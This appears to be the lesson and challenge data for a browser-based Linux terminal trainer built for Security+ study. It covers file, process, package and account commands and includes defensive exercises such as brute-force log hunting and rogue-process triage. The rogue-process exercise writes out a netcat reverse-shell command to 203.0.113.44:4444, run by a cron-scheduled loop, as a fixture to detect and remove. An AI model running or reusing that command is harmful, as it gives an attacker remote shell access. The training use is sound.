        "bs=      block size    (1M, 512, 4K …)\ncount=   how many blocks to copy</pre>" +
        "<pre>dd if=/dev/zero of=/tmp/swapex bs=1M count=50    build a 50 MB empty file\n" +
        "dd if=/dev/sda of=/mnt/evidence.img bs=4M        image an entire disk</pre>" +
        "<p>The rule of thumb: <b>use <code>cp</code> unless <code>cp</code> cannot do it.</b> " +
        "Reach for <code>dd</code> when the source is a raw device, a boot sector, or a disk you " +
        "need copied bit for bit including its free space and deleted-but-not-overwritten data.</p>" +
        "<h3>Why this matters for Security+</h3>" +
        "<p>These four commands sit on both sides of Domain 4.0's incident-response material.</p>" +
        "<p><code>dd</code> is the forensic imaging tool. It captures a disk exactly, including " +
        "slack space and unallocated regions where deleted evidence still lives, and it does so " +
        "without mounting the filesystem — which is what preserves integrity for the chain of " +
        "custody. A <code>cp</code>-based copy would miss all of that.</p>" +
        "<p><code>rm</code> is the other side of the same coin: mass deletion on a compromised " +
        "host is an <b>anti-forensic</b> indicator. An attacker clearing logs and payloads is " +
        "destroying exactly what an investigation needs, and the absence of expected files is " +
        "itself evidence.</p>",
      steps: [
        {
          task: "Copy <code>/etc/passwd</code> into your current directory.",
          hint: "<code>cp /etc/passwd .</code>",
          expectFs: function (api) {
            return exists(api, "/home/sysadmin/passwd");
          },
        },
        {
          task: "Make a directory called <code>backup</code>.",
          hint: "<code>mkdir backup</code>",
          expectFs: function (api) {
            var n = api.lookup("/home/sysadmin/backup");
            return n && n.type === "d";
          },
        },
        {
          task: "Move <code>numbers.txt</code> and <code>letters.txt</code> into <code>backup</code> in one command.",
          hint: "<code>mv numbers.txt letters.txt backup</code> — the last argument is the destination.",
          expectFs: function (api) {
            return (
              exists(api, "/home/sysadmin/backup/numbers.txt") &&
              exists(api, "/home/sysadmin/backup/letters.txt")
            );
          },
        },
        {
          task: "Rename the copied <code>passwd</code> file to <code>passwd.bak</code>.",
          hint: "<code>mv passwd passwd.bak</code>",
          expectFs: function (api) {
            return (
              exists(api, "/home/sysadmin/passwd.bak") &&
              !exists(api, "/home/sysadmin/passwd")
            );
          },
        },
        {
          task: "Try to delete the <code>backup</code> directory with plain <code>rm</code>. It refuses.",
          hint: "<code>rm backup</code>",
          expectCmd: "^rm\\s+backup",
        },
        {
          task: "Delete it properly, recursively.",
          hint: "<code>rm -r backup</code>",
          expectFs: function (api) {
            return !exists(api, "/home/sysadmin/backup");
          },
        },
        {
          task: "Use dd to create a 50 MB zero-filled file at <code>/tmp/swapex</code> — 1 MB blocks, 50 of them.",
          hint: "<code>dd if=/dev/zero of=/tmp/swapex bs=1M count=50</code>",
          expectFs: function (api) {
            var n = api.lookup("/tmp/swapex");
            return n && n.size === 52428800;
          },
        },
      ],
      outro:
        "In forensics this cuts both ways: dd images a disk without altering it, and rm on a live host is an anti-forensic red flag.",
    },

    {
      id: "system",
      title: "System & Network",
      blurb: "ps, ifconfig, ping, shutdown",
      intro:
        "Four commands for answering: what is running, and can I reach anything?",
      teach:
        "<h3>ps — processes</h3>" +
        "<p>Plain <code>ps</code> shows only your own processes attached to the current terminal, " +
        "which is almost never what you want — usually two lines, one of them being " +
        "<code>ps</code> itself:</p>" +
        "<pre>  PID TTY          TIME CMD\n   80 pts/0    00:00:00 bash\n   94 pts/0    00:00:00 ps</pre>" +
        "<p>The four default columns:</p>" +
        "<pre>PID    process identifier — unique, and what you use to act on it\n" +
        "TTY    the controlling terminal; ? means no terminal (a daemon)\n" +
        "TIME   CPU time consumed, not wall-clock age\n" +
        "CMD    the command that started it</pre>" +
        "<p>Two options make it useful:</p>" +
        "<pre>-e    every process on the system, not just yours\n" +
        "-f    full format — adds UID, PPID, and start time\n" +
        "-ef   both, and the form you will actually type</pre>" +
        "<p><code>-f</code> is the important one, because it adds <b>PPID</b> — the parent " +
        "process ID. Every process is started by another, and that lineage is the whole story " +
        "during an investigation:</p>" +
        "<pre>UID    PID  PPID  C STIME TTY   TIME     CMD\nroot   705     1  0 10:29 ?     00:00:00 /usr/sbin/cron -f\n" +
        "sysadmin 3312 705  0 10:31 ?     00:00:04 /bin/bash /tmp/.update</pre>" +
        "<p>Read that second line: something is running from <code>/tmp</code>, and its parent is " +
        "cron. That is not a process someone launched by hand — it is scheduled persistence, and " +
        "the PPID is what told you so.</p>" +
        "<p>Since the output is just text, pipe it to <code>grep</code> to find one thing:</p>" +
        "<pre>ps -ef | grep sshd      is the SSH daemon running?\nps -ef | grep tmp       anything executing out of /tmp?</pre>" +
        "<h3>ifconfig — interface configuration</h3>" +
        "<p>Displays network interfaces: IP address, netmask, broadcast address, MAC, and packet " +
        "counters. <code>eth0</code> is a wired interface, <code>lo</code> is the loopback " +
        "(<code>127.0.0.1</code>, the machine talking to itself).</p>" +
        '<p>You use it to answer "what address am I, and which network am I actually on" — the ' +
        "first question in any connectivity problem, and the way you confirm a host sits in the " +
        "segment you think it does.</p>" +
        "<h3>ping — is anything there</h3>" +
        "<pre>ping -c 4 192.168.1.2     send exactly 4 echo requests, then stop</pre>" +
        "<p>Without <code>-c</code> it runs until interrupted. <code>ping</code> sends ICMP echo " +
        "requests and reports which came back and how long they took; total packet loss means " +
        "either the host is down or something in between is dropping ICMP — a firewall rule " +
        "counts as a successful control, not a failure.</p>" +
        "<h3>shutdown</h3>" +
        "<pre>shutdown TIME [MESSAGE]\n\nshutdown now Goodbye World!    immediately\n" +
        "shutdown +10 Patching in 10   in ten minutes, warn everyone\nshutdown -c                   cancel a scheduled shutdown</pre>" +
        "<p>It brings the system down in an orderly way: broadcasts the message to logged-in " +
        "users, stops accepting new logins, then signals services to terminate cleanly so they " +
        "can flush buffers and close files. Pulling power does none of that, which is how " +
        "filesystems and databases get corrupted.</p>" +
        "<h3>Why this matters for Security+</h3>" +
        "<p><code>ps -ef</code> is live malware triage, and it is Domain 4.0 material. A process " +
        "running from a world-writable directory, a process whose name mimics a system daemon, or " +
        "a parent-child chain that makes no sense — a web server spawning a shell, for instance — " +
        "are all things you find here and nowhere else. <code>ifconfig</code> and <code>ping</code> " +
        "are the pair you use to verify network segmentation actually holds, which is exactly what " +
        "they were for in your Lab 2.1.</p>",
      steps: [
        {
          task: "List your own processes.",
          hint: "<code>ps</code>",
          expectCmd: "^ps\\s*$",
        },
        {
          task: "List every process on the system in full format.",
          hint: "<code>ps -ef</code>",
          expectOutput: "PPID",
        },
        {
          task: "Pipe that into grep to find just the SSH daemon. This is the everyday way to check whether a service is running.",
          hint: "<code>ps -ef | grep sshd</code>",
          expectCmd: "\\|",
          expectOutput: "sshd",
        },
        {
          task: "Show the network interface configuration.",
          hint: "<code>ifconfig</code>",
          expectOutput: "192\\.168\\.56\\.102",
        },
        {
          task: "Ping <code>192.168.56.101</code> exactly 4 times — the Metasploitable host from your labs.",
          hint: "<code>ping -c 4 192.168.56.101</code>",
          expectOutput: "4 packets transmitted, 4 received",
        },
        {
          task: "Schedule a shutdown for right now with the message <code>Goodbye World!</code>",
          hint: "<code>shutdown now Goodbye World!</code>",
          expectCmd: "^shutdown\\s+now",
          expectOutput: "Goodbye World",
        },
      ],
      outro:
        "ps -ef piped into grep is the single most-used troubleshooting command on this list.",
    },

    {
      id: "pkgacct",
      title: "Packages, Accounts & Redirection",
      blurb: "apt-get, dpkg, passwd -S, and sending output to a file",
      intro:
        "Patch management, account status, and getting output out of the terminal.",
      teach:
        "<h3>dpkg and apt-get</h3>" +
        "<p><code>dpkg</code> — Debian Package — is the low-level tool that actually installs and " +
        "removes packages. It does exactly what you tell it and nothing more: it will not resolve " +
        "dependencies or fetch anything from the network.</p>" +
        "<p><code>apt-get</code> is the front end to <code>dpkg</code>. It talks to repositories, " +
        "works out dependencies, downloads what is needed, and then hands off to <code>dpkg</code> " +
        "to do the installing. In practice you type <code>apt-get</code> and let it drive.</p>" +
        "<pre>sudo apt-get update            refresh the package lists (does NOT upgrade)\n" +
        "sudo apt-get upgrade           actually install the newer versions\n" +
        "apt-cache search KEYWORD       find a package by keyword\n" +
        "sudo apt-get install PKG       install\n" +
        "sudo apt-get remove PKG        uninstall, but KEEP config files\n" +
        "sudo apt-get purge PKG         uninstall completely, config and all</pre>" +
        "<p>The distinction the exam actually tests is <b>update vs upgrade</b>. " +
        "<code>update</code> only refreshes the local list of what versions exist — it changes no " +
        "installed software whatsoever. <code>upgrade</code> is the one that installs the newer " +
        "versions. Running <code>upgrade</code> without <code>update</code> first upgrades against " +
        "a stale catalogue and can miss the patch you were trying to apply.</p>" +
        "<p>The other pairing worth knowing is <b>remove vs purge</b>. <code>remove</code> " +
        "uninstalls the program but deliberately leaves configuration files behind, so " +
        "reinstalling restores your settings. <code>purge</code> deletes those too. If a package " +
        "was removed because its configuration was the problem — bad credentials, an insecure " +
        "setting — <code>remove</code> leaves that file sitting on disk, and only " +
        "<code>purge</code> is a complete uninstall.</p>" +
        "<pre>dpkg -l                        list installed packages\napt-cache search KEYWORD       find a package by keyword</pre>" +
        "<h3>passwd — account and password status</h3>" +
        "<p><code>passwd</code> on its own changes your password. With <code>-S</code> it reports " +
        "the status of an account instead, and that output is audit evidence:</p>" +
        "<pre>sysadmin P 12/20/2025 0 99999 7 -1\n    │    │      │       │   │   │  └ inactive threshold\n" +
        "    │    │      │       │   │   └ warning days\n    │    │      │       │   └ max age\n" +
        "    │    │      │       └ min age\n    │    │      └ last change date\n    │    └ status\n    └ username</pre>" +
        "<p>The status letter is the field that matters:</p>" +
        "<pre>P     usable password — normal\nL     locked — the account cannot authenticate by password\n" +
        "NP    NO PASSWORD — the account can be used without authenticating</pre>" +
        "<p><code>NP</code> is a serious finding on its own. <code>L</code> usually is not — " +
        "locking the root password is standard hardening, since it forces everyone through " +
        "<code>sudo</code> where their actions are attributable. Context decides which is a " +
        "problem.</p>" +
        "<p>The remaining numeric fields are the password-aging policy: minimum age, maximum age, " +
        "warning period, and inactivity threshold. They map directly onto the password-policy " +
        "language in the exam objectives — a maximum age of 99999 days means the password " +
        "effectively never expires.</p>" +
        "<h3>Redirection and pipes</h3>" +
        "<p>By default a command writes to your screen. These three operators send that output " +
        "somewhere more useful:</p>" +
        "<pre>command &gt;  file     write to the file, OVERWRITING whatever was there\n" +
        "command &gt;&gt; file     APPEND to the file, keeping the existing contents\n" +
        "command |  command  feed the output into another command instead</pre>" +
        "<pre>echo 'audit start' &gt; audit.txt      create (or clobber) the file\n" +
        "echo 'checked accounts' &gt;&gt; audit.txt append a second line\n" +
        "passwd -S sysadmin &gt; evidence.txt    capture command output as evidence\n" +
        "ps -ef | grep sshd                   filter one command through another</pre>" +
        "<p>Confusing <code>&gt;</code> with <code>&gt;&gt;</code> is how people destroy log files " +
        "by accident: a single <code>&gt;</code> where you meant two truncates the target to " +
        "exactly what you just wrote, and everything previously in it is gone. There is no " +
        "warning.</p>" +
        "<p>The mental model is worth stating plainly: <code>&gt;</code> and <code>&gt;&gt;</code> " +
        "send output to a <b>file</b>; <code>|</code> sends it to another <b>command</b>.</p>" +
        "<h3>Why this matters for Security+</h3>" +
        "<p>Two objectives meet here. <code>apt-get update</code> and <code>upgrade</code> are " +
        "<b>patch management</b> — the most basic vulnerability-mitigation control there is, and " +
        "the reason unpatched software keeps appearing in breach reports. <code>passwd -S</code> " +
        "is <b>identity and access management</b>: account status and password aging are precisely " +
        "the evidence an access-control audit asks for under Domain 5.0. Redirection is what turns " +
        "either of them into a durable artifact instead of text that scrolls off the screen.</p>",
      steps: [
        {
          task: "Refresh the package lists.",
          hint: "<code>sudo apt-get update</code>",
          expectOutput: "Reading package lists",
        },
        {
          task: "Search the package cache for a port scanner.",
          hint: "<code>apt-cache search scanner</code>",
          expectOutput: "nmap",
        },
        {
          task: "Install <code>nmap</code>.",
          hint: "<code>sudo apt-get install nmap</code>",
          expectOutput: "Setting up nmap",
        },
        {
          task: "Check the password status of the <code>sysadmin</code> account.",
          hint: "<code>passwd -S sysadmin</code>",
          expectOutput: "sysadmin P",
        },
        {
          task: "Check root's password status. Note the different status letter — root's password is locked, which is normal hardening.",
          hint: "<code>sudo passwd -S root</code>",
          expectOutput: "root L",
        },
        {
          task: "Write the text <code>audit start</code> into a new file called <code>audit.txt</code>.",
          hint: "<code>echo 'audit start' &gt; audit.txt</code>",
          expectFs: function (api) {
            var n = api.lookup("/home/sysadmin/audit.txt");
            return n && /audit start/.test(n.content);
          },
        },
        {
          task: "Append the line <code>checked accounts</code> to that same file — without destroying what is already in it.",
          hint: "<code>echo 'checked accounts' &gt;&gt; audit.txt</code>",
          expectFs: function (api) {
            var n = api.lookup("/home/sysadmin/audit.txt");
            return (
              n &&
              /audit start/.test(n.content) &&
              /checked accounts/.test(n.content)
            );
          },
        },
        {
          task: "Read it back to confirm both lines are there.",
          hint: "<code>cat audit.txt</code>",
          expectOutput: "checked accounts",
        },
      ],
      outro:
        "> overwrites and >> appends — mixing them up is how people destroy log files by accident.",
    },
  ];

  /* ════════════════════════════════════════
     CHALLENGES — from the SEC+ domain mapping
  ════════════════════════════════════════ */

  /* A realistic auth.log: normal traffic, then a Hydra burst against
     msfadmin from the Kali host, matching the Lab 4.1 report. */
  function bruteForceLog() {
    var out =
      "Jul 15 08:02:11 target sshd[1102]: Accepted password for sysadmin from 192.168.56.1 port 50122 ssh2\n" +
      "Jul 15 08:14:52 target sshd[1140]: pam_unix(sshd:session): session opened for user sysadmin\n" +
      "Jul 15 08:41:03 target cron[1188]: pam_unix(cron:session): session opened for user root\n" +
      "Jul 15 09:12:44 target sshd[1204]: Accepted publickey for backup from 192.168.56.5 port 41022 ssh2\n" +
      "Jul 15 09:58:17 target sudo:  sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/usr/bin/apt-get update\n";
    /* the burst — 47 failures in a few seconds, one source, one account */
    var sec = 0;
    for (var i = 0; i < 47; i++) {
      sec = 12 + Math.floor(i / 6);
      out +=
        "Jul 15 10:07:" +
        (sec < 10 ? "0" + sec : sec) +
        " target sshd[" +
        (1500 + i) +
        "]: Failed password for msfadmin from 192.168.56.101 port " +
        (44000 + i) +
        " ssh2\n";
    }
    out +=
      "Jul 15 10:07:21 target sshd[1547]: Accepted password for msfadmin from 192.168.56.101 port 44047 ssh2\n" +
      "Jul 15 10:07:21 target sshd[1547]: pam_unix(sshd:session): session opened for user msfadmin\n" +
      "Jul 15 10:31:55 target sshd[1602]: Accepted publickey for sysadmin from 192.168.56.1 port 52001 ssh2\n";
    return out;
  }

  var challenges = [
    {
      id: "bruteforce",
      title: "Hunt the brute force",
      blurb:
        "An auth log with 50+ entries. Find the attack and prove it succeeded.",
      domain: "4.0 Security Operations",
      intro:
        "You are on the target host. /var/log/auth.log covers this morning. Something happened at 10:07.",
      teach:
        "<p>This is the exact workflow from your SEC+ Lab 4.1, run by hand. A SIEM like Wazuh " +
        "automates it — but the detection logic is what you are typing.</p>" +
        "<p>Remember the log is <code>rw-r-----</code> root:adm, so every read needs <code>sudo</code>.</p>",
      setup: function (api) {
        api.writeFile(
          "/var/log/auth.log",
          bruteForceLog(),
          "rw-r-----",
          "root",
          "adm",
        );
      },
      steps: [
        {
          task: "First, learn the shape of a normal entry — read the first 5 lines of the log.",
          hint: "<code>sudo head -5 /var/log/auth.log</code>",
          expectOutput: "Accepted password",
        },
        {
          task: 'Now isolate the failed logins. OpenSSH writes the exact string "Failed password" on every bad credential.',
          hint: "<code>sudo grep 'Failed password' /var/log/auth.log</code>",
          expectOutput: "Failed password for msfadmin",
        },
        {
          task: "Count them instead of printing them — you want the number, not 47 lines of noise.",
          hint: "<code>sudo grep -c 'Failed password' /var/log/auth.log</code>",
          expectOutput: "^47$",
        },
        {
          task: "The attacker guessed correctly at the end. Find the successful logins and spot which one came from the attacking host.",
          hint: "<code>sudo grep 'Accepted' /var/log/auth.log</code> — look for 192.168.56.101.",
          expectOutput:
            "Accepted password for msfadmin from 192\\.168\\.56\\.101",
        },
        {
          task: "Confirm the scale of it: count every line mentioning the attacker's IP, 192.168.56.101.",
          hint: "<code>sudo grep -c '192.168.56.101' /var/log/auth.log</code>",
          expectOutput: "^(48|49)$",
        },
      ],
      outro:
        "47 failures then one success from a single IP in 9 seconds — a successful brute force, and the account is now compromised.",
    },

    {
      id: "leastpriv",
      title: "Fix the least-privilege violations",
      blurb:
        "Someone ran chmod 777 on things that should never be world-writable.",
      domain: "3.0 Security Architecture",
      intro:
        "A junior admin 'fixed' a permissions problem the fast way. /opt/app is now a liability.",
      teach:
        "<p><code>chmod 777</code> grants read, write, and execute to <i>everyone</i> on the system. " +
        "On a config file holding credentials that is a direct path to privilege escalation — any " +
        "local user can rewrite it.</p>" +
        "<p>Target state: the config readable and writable only by its owner " +
        "(<code>rw-------</code>, i.e. 600), and the script executable by owner and group but not " +
        "writable by anyone else (<code>rwxr-x---</code>, i.e. 750).</p>",
      setup: function (api) {
        api.makeDir("/opt", "rwxr-xr-x", "root", "root");
        api.makeDir("/opt/app", "rwxrwxrwx", "sysadmin", "sysadmin");
        api.writeFile(
          "/opt/app/config.ini",
          "[db]\nhost=10.0.0.14\nuser=appsvc\npassword=Sup3rS3cret!\n",
          "rwxrwxrwx",
          "sysadmin",
          "sysadmin",
        );
        api.writeFile(
          "/opt/app/run.sh",
          '#!/bin/bash\necho "starting app"\n',
          "rwxrwxrwx",
          "sysadmin",
          "sysadmin",
        );
      },
      steps: [
        {
          task: "Long-list <code>/opt/app</code> and see how bad it is. Every file should read <code>rwxrwxrwx</code>.",
          hint: "<code>ls -l /opt/app</code>",
          expectOutput: "rwxrwxrwx",
        },
        {
          task: "Lock <code>config.ini</code> down to owner read/write only — nothing for group or other.",
          hint: "<code>chmod 600 /opt/app/config.ini</code>",
          expectFs: function (api) {
            return mode(api, "/opt/app/config.ini") === "rw-------";
          },
        },
        {
          task: "Set <code>run.sh</code> to <code>rwxr-x---</code>: owner full, group read+execute, other nothing.",
          hint: "<code>chmod 750 /opt/app/run.sh</code>",
          expectFs: function (api) {
            return mode(api, "/opt/app/run.sh") === "rwxr-x---";
          },
        },
        {
          task: "The directory itself is still world-writable — anyone can delete files from it. Remove write permission for group and other using <b>symbolic</b> mode.",
          hint: "<code>chmod go-w /opt/app</code>",
          expectFs: function (api) {
            var m = mode(api, "/opt/app");
            return m.charAt(4) !== "w" && m.charAt(7) !== "w";
          },
        },
        {
          task: "Finally, hand ownership of the config to root so an unprivileged compromise cannot touch it.",
          hint: "<code>sudo chown root /opt/app/config.ini</code>",
          expectFs: function (api) {
            var n = api.lookup("/opt/app/config.ini");
            return n && n.owner === "root";
          },
        },
      ],
      outro:
        "Correct permission bits, not chmod 777 — this is objective 3.x least privilege stated in three commands.",
    },

    {
      id: "rogueproc",
      title: "Triage a suspicious process",
      blurb: "Something is running out of /tmp. Find it and trace its parent.",
      domain: "4.0 Security Operations",
      intro:
        "Monitoring flagged outbound traffic from this host. Nothing should be listening. Find out what is.",
      teach:
        "<p>A binary executing from <code>/tmp</code> is one of the oldest red flags there is — " +
        "<code>/tmp</code> is world-writable, so anyone who lands on the box can drop a payload there.</p>" +
        "<p><code>ps -ef</code> gives you the parent PID (PPID) column. Tracing a suspicious process " +
        "back to its parent tells you <i>how</i> it started: a web server parent means a web " +
        "exploit, a cron parent means persistence.</p>",
      setup: function (api) {
        api.writeFile(
          "/tmp/.update",
          "#!/bin/bash\nwhile true; do nc 203.0.113.44 4444 -e /bin/bash; sleep 60; done\n",
          "rwxrwxrwx",
          "sysadmin",
          "sysadmin",
        );
        api.writeFile(
          "/var/spool/cron-sysadmin",
          "*/5 * * * * /tmp/.update\n",
          "rw-r--r--",
          "sysadmin",
          "sysadmin",
        );
      },
      procs: [
        {
          uid: "sysadmin",
          pid: 3312,
          ppid: 705,
          tty: "?",
          time: "00:00:04",
          cmd: "/bin/bash /tmp/.update",
        },
        {
          uid: "sysadmin",
          pid: 3319,
          ppid: 3312,
          tty: "?",
          time: "00:00:00",
          cmd: "nc 203.0.113.44 4444 -e /bin/bash",
        },
      ],
      steps: [
        {
          task: "List every process in full format.",
          hint: "<code>ps -ef</code>",
          expectOutput: "PPID",
        },
        {
          task: "Narrow it down — find the processes running from <code>/tmp</code>.",
          hint: "<code>ps -ef | grep tmp</code>",
          expectOutput: "/tmp/\\.update",
        },
        {
          task: "The parent PID of <code>/tmp/.update</code> is 705. Find out what process 705 is.",
          hint: "<code>ps -ef | grep 705</code> — it is cron, which means this is scheduled persistence.",
          expectOutput: "cron",
        },
        {
          task: "Read the payload itself — it is a hidden file, so a plain <code>ls /tmp</code> will not show it.",
          hint: "<code>cat /tmp/.update</code>",
          expectOutput: "203\\.0\\.113\\.44",
        },
        {
          task: "Confirm the persistence mechanism by reading the cron entry at <code>/var/spool/cron-sysadmin</code>.",
          hint: "<code>cat /var/spool/cron-sysadmin</code>",
          expectOutput: "/tmp/\\.update",
        },
        {
          task: "Remove the payload.",
          hint: "<code>rm /tmp/.update</code>",
          expectFs: function (api) {
            return !exists(api, "/tmp/.update");
          },
        },
      ],
      outro:
        "Reverse shell to 203.0.113.44:4444, restarted every 5 minutes by cron. Deleting the payload alone would not have been enough — the cron entry had to go too.",
    },

    {
      id: "recon",
      title: "Spot the recon indicators",
      blurb: "Hidden files and a wrong file type. Find what does not belong.",
      domain: "2.0 Threats, Vulnerabilities & Mitigations",
      intro:
        "This home directory belongs to a user who reported 'weird behavior'. Look for what should not be here.",
      teach:
        "<p>Attackers hide things in plain sight. A leading dot makes a file invisible to plain " +
        "<code>ls</code> — you need <code>-a</code>. And a file whose <i>type</i> is wrong for its " +
        "name (a regular file where a symlink belongs, or a stray SUID binary) is worth a second look.</p>" +
        "<p><code>ls -la</code> is the single command that surfaces all of it.</p>",
      setup: function (api) {
        api.writeFile(
          "/home/sysadmin/.hidden_harvest",
          "sysadmin:$6$xK2$abc123\nbackup:$6$pQ9$def456\nappsvc:$6$mN4$ghi789\n",
          "rw-r--r--",
          "sysadmin",
          "sysadmin",
        );
        api.writeFile(
          "/home/sysadmin/.ssh_backdoor",
          "ssh-rsa AAAAB3NzaC1yc2EAAAADAQ attacker@kali\n",
          "rw-r--r--",
          "sysadmin",
          "sysadmin",
        );
      },
      steps: [
        {
          task: "List the home directory normally. Note what you can see.",
          hint: "<code>ls</code>",
          expectCmd: "^ls\\s*$",
        },
        {
          task: "Now list <b>all</b> files in long form. Two files appear that were invisible a moment ago.",
          hint: "<code>ls -la</code>",
          expectOutput: "\\.hidden_harvest",
        },
        {
          task: "Read <code>.hidden_harvest</code>. Those are password hashes staged for exfiltration.",
          hint: "<code>cat .hidden_harvest</code>",
          expectOutput: "\\$6\\$",
        },
        {
          task: "Read the other hidden file — an SSH public key that does not belong to anyone here.",
          hint: "<code>cat .ssh_backdoor</code>",
          expectOutput: "attacker@kali",
        },
        {
          task: "Use grep to search <code>/etc/passwd</code> for accounts with a real login shell — the ones worth targeting.",
          hint: "<code>grep 'bash' /etc/passwd</code>",
          expectOutput: "/bin/bash",
        },
        {
          task: "Delete both planted files in one command.",
          hint: "<code>rm .hidden_harvest .ssh_backdoor</code>",
          expectFs: function (api) {
            return (
              !exists(api, "/home/sysadmin/.hidden_harvest") &&
              !exists(api, "/home/sysadmin/.ssh_backdoor")
            );
          },
        },
      ],
      outro:
        "Staged hashes plus an unauthorized authorized-key is a compromise in progress, not a curiosity.",
    },

    {
      id: "audit",
      title: "Pull access-control audit evidence",
      blurb: "An auditor wants proof. Produce it and write it to a file.",
      domain: "5.0 Program Management & Oversight",
      intro:
        "You have been asked to evidence who owns what, and which accounts have usable passwords.",
      teach:
        "<p>This domain is about producing evidence, not fixing things. Two commands supply most " +
        "of it: <code>ls -l</code> for file ownership, and <code>passwd -S</code> for account status.</p>" +
        "<p>Status letters: <code>P</code> usable password · <code>L</code> locked · <code>NP</code> " +
        "no password. An account with <code>NP</code> is a finding on its own — it can be used " +
        "without authenticating.</p>" +
        "<p>Redirect the output to a file so the evidence is durable rather than scrolling off the screen.</p>",
      setup: function (api) {
        api.makeDir("/srv", "rwxr-xr-x", "root", "root");
        api.makeDir("/srv/finance", "rwxr-x---", "root", "adm");
        api.writeFile(
          "/srv/finance/ledger.csv",
          "date,account,amount\n2026-07-01,4100,18240.55\n",
          "rw-rw-rw-",
          "appsvc",
          "sysadmin",
        );
        api.writeFile(
          "/srv/finance/payroll.csv",
          "employee,salary\nA. Ruiz,98000\n",
          "rw-r-----",
          "root",
          "adm",
        );
      },
      steps: [
        {
          task: "Long-list <code>/srv/finance</code> to capture ownership and permissions of the sensitive files.",
          hint: "<code>sudo ls -l /srv/finance</code> — the directory is root:adm, so you need sudo.",
          expectOutput: "ledger\\.csv",
        },
        {
          task: "One of those two files is world-writable, which is an audit finding. Fix it — remove write access for group and other on <code>ledger.csv</code>.",
          hint: "<code>sudo chmod go-w /srv/finance/ledger.csv</code>",
          expectFs: function (api) {
            var m = mode(api, "/srv/finance/ledger.csv");
            return m.charAt(4) !== "w" && m.charAt(7) !== "w";
          },
        },
        {
          task: "Check the password status of the <code>sysadmin</code> account.",
          hint: "<code>passwd -S sysadmin</code>",
          expectOutput: "sysadmin P",
        },
        {
          task: "Check the <code>daemon</code> account. Its status letter is different — and it is the one an auditor will ask about.",
          hint: "<code>sudo passwd -S daemon</code>",
          expectOutput: "daemon NP",
        },
        {
          task: "Write your evidence to a file: send the output of <code>passwd -S sysadmin</code> into <code>~/audit-evidence.txt</code>.",
          hint: "<code>passwd -S sysadmin &gt; ~/audit-evidence.txt</code>",
          expectFs: function (api) {
            var n = api.lookup("/home/sysadmin/audit-evidence.txt");
            return n && /sysadmin P/.test(n.content);
          },
        },
        {
          task: "Append the accounts from <code>/etc/passwd</code> that have a bash shell to the same evidence file.",
          hint: "<code>grep bash /etc/passwd &gt;&gt; ~/audit-evidence.txt</code>",
          expectFs: function (api) {
            var n = api.lookup("/home/sysadmin/audit-evidence.txt");
            return (
              n && /sysadmin P/.test(n.content) && /\/bin\/bash/.test(n.content)
            );
          },
        },
      ],
      outro:
        "Ownership listings and account-status output are the raw evidence behind an access-control review.",
    },
  ];

  return { lessons: lessons, challenges: challenges };
})();
